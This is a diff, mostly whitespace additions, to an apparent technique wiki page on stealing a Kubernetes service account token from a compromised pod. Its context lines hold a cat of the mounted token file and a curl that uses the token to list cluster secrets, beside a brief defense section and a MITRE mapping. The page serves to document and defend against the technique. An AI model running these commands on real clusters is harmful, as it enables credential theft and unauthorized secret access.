@@ -35,9 +35,13 @@ To retrieve a Privileged Service Account Token, the attacker can simply access t
 
 This attack can be carried out by an attacker who has already gained access to a pod within the Kubernetes cluster.
 
+ 
+
 ## Requirements
 
 1. Access to a pod within the Kubernetes cluster
+
+ 
 
 ## Defense
 
@@ -47,17 +51,29 @@ This attack can be carried out by an attacker who has already gained access to a
 
 1. Monitor the Kubernetes API for unusual activity, such as requests from unknown IP addresses.
 
+ 
+
 ## Objectives
 
 1. Retrieve a Privileged Service Account Token
+
+ 
 
 # Instructions
 
 1. Run the following commands:
 
+ 
+
+
+
 **Code**: [[$ cat /run/secrets/kubernetes.io/serviceaccount/to]]
 
+
+
 > The first command retrieves the token from the pod's file system. The second command uses the token to authenticate with the Kubernetes API and retrieve the secrets from the default namespace.
+
+
 
 **Command** ([[Retrieve Kubernetes Service Account Token]]):
 
@@ -66,11 +82,17 @@ $ cat /run/secrets/kubernetes.io/serviceaccount/token
 
 ```
 
+
+
+
+
 **Command** ([[Retrieve Default Namespace Secrets]]):
 
 ```bash
 $ curl -k -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/default/secrets/
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -92,3 +114,5 @@ $ curl -k -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/a
 
 - [[Kubernetes]]
 - [[Privileged Service Account Token]]
+
+
